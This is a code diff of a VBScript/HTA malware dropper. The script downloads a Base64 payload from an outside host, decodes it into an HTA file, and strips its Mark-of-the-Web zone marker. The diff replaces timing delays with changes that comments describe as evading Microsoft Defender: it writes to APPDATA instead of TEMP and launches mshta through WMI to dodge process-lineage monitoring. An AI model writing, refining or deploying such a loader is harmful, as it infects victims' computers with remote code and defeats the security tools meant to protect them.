@@ -10,12 +10,7 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' 1. WAIT 2 SECONDS (Breaks Defender's behavior chain)
-Dim w: w = Timer()
-Do While Timer() - w < 2
-Loop
-
-' 2. Fetch the Base64 payload
+' 1. Fetch the Base64 payload
 xh.Open "GET", "https://dicerigx.app/payload.txt", False
 xh.Send
 
@@ -27,7 +22,8 @@ If xh.Status = 200 Then
     cleanB64 = Replace(cleanB64, " ", "")
     cleanB64 = Trim(cleanB64)
     
-    path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
+    ' 2. Write to APPDATA instead of TEMP (Defender watches TEMP heavily)
+    path = sh.ExpandEnvironmentStrings("%APPDATA%") & "\sys.hta"
     
     Set xml = CreateObject("MSXML2.DOMDocument")
     Set node = xml.CreateElement("b64")
@@ -41,16 +37,15 @@ If xh.Status = 200 Then
     st.SaveToFile path, 2
     st.Close
     
+    ' 3. Strip MOTW
     On Error Resume Next
     fso.DeleteFile path & ":Zone.Identifier", True
     On Error GoTo 0
     
-    ' 3. WAIT 2 SECONDS BEFORE RUNNING (Breaks the chain again)
-    w = Timer()
-    Do While Timer() - w < 2
-    Loop
-    
-    sh.Run "mshta.exe """ & path & """", 0, False
+    ' 4. Spawn via WMI (Bypasses process lineage monitoring)
+    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Dim proc: Set proc = wmi.Get("Win32_Process")
+    proc.Create "mshta.exe """ & path & """", Null, Null
 End If
 
 window.close()
